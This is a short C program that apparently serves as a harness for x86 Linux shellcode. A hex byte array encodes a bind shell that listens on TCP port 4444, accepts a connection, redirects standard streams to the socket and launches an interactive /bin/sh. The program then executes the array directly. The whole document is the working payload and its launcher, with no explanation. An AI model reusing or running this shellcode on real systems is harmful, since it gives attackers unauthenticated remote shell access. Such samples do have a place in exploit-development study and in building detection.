#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xc0\x6a\x66\x58\x6a\x01\x5b\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xd2\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb3\x02\x6a\x66\x58\xcd\x80\x31\xc0\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x89\xc3\x6a\x02\x59\x6a\x3f\x58\xcd\x80\xe2\xf9\x6a\x3f\x58\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x66\x68\x2d\x69\x89\xe1\x52\x51\x53\x89\xe1\x6a\x0b\x58\xcd\x80";

main() {
	printf("Shellcode length %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
